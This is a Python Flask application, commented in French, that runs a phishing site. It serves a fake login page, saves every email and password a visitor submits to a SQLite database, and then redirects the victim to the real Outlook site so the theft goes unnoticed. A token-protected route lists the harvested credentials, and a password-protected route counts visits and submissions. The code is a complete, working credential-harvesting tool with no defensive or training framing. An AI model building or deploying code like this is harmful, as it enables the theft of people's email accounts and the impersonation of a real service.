from flask import Flask, render_template, request, redirect, Response
from flask_sqlalchemy import SQLAlchemy
import os

app = Flask(__name__)

# Configuration de la base de données SQLite
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///phishing_data.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

db = SQLAlchemy(app)

# Définition du modèle pour stocker les identifiants
class Credential(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), nullable=False)
    password = db.Column(db.String(120), nullable=False)

# Création des tables (à exécuter une seule fois)
with app.app_context():
    db.create_all()

# Définition du mot de passe admin
ADMIN_PASSWORD = "Saouda2025!!"

# Définition du Token Secret
SECRET_TOKEN = "inchaalah narbah 2025"

# Variables pour stocker les statistiques
total_visits = 0
total_submissions = 0

# Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    global total_visits
    total_visits += 1  # Incrémenter le compteur de visites
    return render_template("login.html")

# Route qui récupère les identifiants saisis et les stocke
@app.route("/submit", methods=["POST"])
def submit():
    global total_submissions
    total_submissions += 1  # Incrémenter le compteur de soumissions
    
    email = request.form["email"]
    password = request.form["password"]
    
    # Enregistrer les identifiants dans la base de données
    new_cred = Credential(email=email, password=password)
    db.session.add(new_cred)
    db.session.commit()
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")
    
    # Redirige l'utilisateur vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# Route protégée pour afficher les identifiants
@app.route("/logs")
def logs():
    token = request.args.get("token")
    if token != SECRET_TOKEN:
        return Response("Accès refusé !", 401)
    
    credentials = Credential.query.all()
    result = "<h2>Identifiants enregistrés :</h2><ul>"
    for cred in credentials:
        result += f"<li>Email: {cred.email} | Password: {cred.password}</li>"
    result += "</ul>"
    return result

# Route protégée pour afficher les statistiques
@app.route("/stats")
def stats():
    auth = request.authorization
    if not auth or auth.password != ADMIN_PASSWORD:
        return Response("Accès refusé !", 401, {"WWW-Authenticate": 'Basic realm="Login Required"'})
    
    return f"Nombre total de visites : {total_visits}<br>Nombre total de soumissions : {total_submissions}"

# Lancer le serveur Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=True)